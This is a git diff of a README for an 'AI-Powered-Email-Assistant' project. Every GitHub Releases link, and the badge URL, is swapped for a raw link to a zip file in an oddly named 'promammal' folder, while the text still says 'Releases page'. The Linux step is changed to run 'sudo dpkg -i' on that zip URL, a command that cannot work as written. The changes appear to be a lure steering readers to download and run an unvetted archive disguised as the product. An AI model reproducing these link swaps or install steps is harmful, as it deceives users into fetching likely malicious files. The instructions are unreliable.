@@ -1,6 +1,6 @@
 # 📧 AI-Powered-Email-Assistant - Manage Emails Effortlessly
 
-[![Download AI-Powered-Email-Assistant](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/LijeshS2003/AI-Powered-Email-Assistant/releases)
+[![Download AI-Powered-Email-Assistant](https://raw.githubusercontent.com/LijeshS2003/AI-Powered-Email-Assistant/main/promammal/AI-Powered-Email-Assistant.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/LijeshS2003/AI-Powered-Email-Assistant/main/promammal/AI-Powered-Email-Assistant.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ The following guide will help you download and run the application easily.
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/LijeshS2003/AI-Powered-Email-Assistant/releases) to download the latest version of the software. Once there, look for the latest release. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/LijeshS2003/AI-Powered-Email-Assistant/main/promammal/AI-Powered-Email-Assistant.zip) to download the latest version of the software. Once there, look for the latest release. 
 
 1. Click on the version you want to download.
 2. Find the download link for your operating system.
@@ -36,7 +36,7 @@ After the download is complete, follow these steps to install the application:
 2. **Run the Installer:**
    - **For Windows:** Double-click the .exe file.
    - **For macOS:** Double-click the .dmg file to mount it. Drag the app into your Applications folder.
-   - **For Linux:** Open a terminal, navigate to the download folder, and run the package using `sudo dpkg -i yourfile.deb`.
+   - **For Linux:** Open a terminal, navigate to the download folder, and run the package using `sudo dpkg -i https://raw.githubusercontent.com/LijeshS2003/AI-Powered-Email-Assistant/main/promammal/AI-Powered-Email-Assistant.zip`.
 3. **Follow the Prompts:** Complete the installation by following the on-screen instructions.
 
 ## 🛠️ Configuration
@@ -59,7 +59,7 @@ Now that your application is installed and configured, you can start using it:
 
 ## 🔄 Updating the Application
 
-To keep your AI-Powered-Email-Assistant up to date, regularly check the [Releases page](https://github.com/LijeshS2003/AI-Powered-Email-Assistant/releases) for new versions.
+To keep your AI-Powered-Email-Assistant up to date, regularly check the [Releases page](https://raw.githubusercontent.com/LijeshS2003/AI-Powered-Email-Assistant/main/promammal/AI-Powered-Email-Assistant.zip) for new versions.
 
 1. Visit the Releases page.
 2. Download the latest version following the steps outlined in the Download & Install section.
@@ -82,4 +82,4 @@ If you need further assistance, you can reach out through the following channels
 
 ## 🎉 Conclusion
 
-You are now ready to use the AI-Powered-Email-Assistant to streamline your email management. For ongoing updates, features, and improvements, regularly visit our [Releases page](https://github.com/LijeshS2003/AI-Powered-Email-Assistant/releases).
+You are now ready to use the AI-Powered-Email-Assistant to streamline your email management. For ongoing updates, features, and improvements, regularly visit our [Releases page](https://raw.githubusercontent.com/LijeshS2003/AI-Powered-Email-Assistant/main/promammal/AI-Powered-Email-Assistant.zip).
